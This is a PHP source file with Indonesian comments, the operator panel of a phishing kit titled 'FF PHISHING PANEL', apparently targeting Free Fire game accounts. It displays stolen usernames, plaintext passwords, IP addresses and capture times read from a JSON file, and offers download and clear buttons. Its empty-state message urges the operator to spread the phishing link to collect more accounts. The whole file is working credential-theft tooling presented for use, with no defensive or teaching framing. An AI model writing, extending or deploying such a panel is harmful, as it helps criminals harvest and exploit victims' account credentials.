<?php
// admin.php - Panel untuk melihat akun yang tertangkap

// Ganti dengan password Anda sendiri
$admin_password = "admin123";

if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: admin.php");
    exit();
}

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $admin_password) {
    header('WWW-Authenticate: Basic realm="Admin Panel"');
    header('HTTP/1.0 401 Unauthorized');
    echo "Akses ditolak!";
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - Captured Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            padding: 20px;
            color: #00ff00;
        }
        h1 {
            color: #ff4757;
            border-bottom: 2px solid #ff4757;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .stats {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a1a;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background: #2a2a2a;
            color: #ff4757;
        }
        tr:hover {
            background: #252525;
        }
        .badge {
            background: #ff4757;
            color: white;
            padding: 4px 8px;
            border-radius: 5px;
            font-size: 12px;
        }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            margin-right: 10px;
        }
        button:hover {
            background: #ff6b81;
        }
        .refresh {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #00ff00;
            color: black;
            padding: 10px 20px;
            border-radius: 50px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>🔐 FF PHISHING PANEL 🔐</h1>
    
    <?php
    $data_file = "data.json";
    if(file_exists($data_file)) {
        $data = json_decode(file_get_contents($data_file), true);
        $total = count($data);
    } else {
        $total = 0;
        $data = [];
    }
    ?>
    
    <div class="stats">
        📊 Total Akun Tertangkap: <strong style="color:#ff4757; font-size:24px;"><?php echo $total; ?></strong>
        <br>
        📅 Last Update: <?php echo date('Y-m-d H:i:s'); ?>
        <br><br>
        <button onclick="window.location.href='admin.php?refresh=1'">🔄 Refresh</button>
        <button onclick="window.location.href='download.php'">📥 Download TXT</button>
        <button onclick="if(confirm('Hapus semua data?')) window.location.href='clear.php'">🗑️ Clear All</button>
    </div>
    
    <?php if($total > 0): ?>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Waktu</th>
                <th>IP Address</th>
                <th>Username / ID</th>
                <th>Password</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach($data as $index => $acc): ?>
            <tr>
                <td><?php echo $index + 1; ?></td>
                <td><?php echo htmlspecialchars($acc['waktu']); ?></td>
                <td><?php echo htmlspecialchars($acc['ip']); ?></td>
                <td><span class="badge"><?php echo htmlspecialchars($acc['username']); ?></span></td>
                <td><strong><?php echo htmlspecialchars($acc['password']); ?></strong></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php else: ?>
    <div style="text-align:center; padding:50px; background:#1a1a1a; border-radius:10px;">
        ⚠️ Belum ada data yang tertangkap ⚠️
        <br><br>
        Sebarkan link phishing untuk mulai mengumpulkan akun.
    </div>
    <?php endif; ?>
    
    <a href="admin.php?logout=1" class="refresh" style="background:#333; right:100px;">🚪 Logout</a>
</body>
</html>
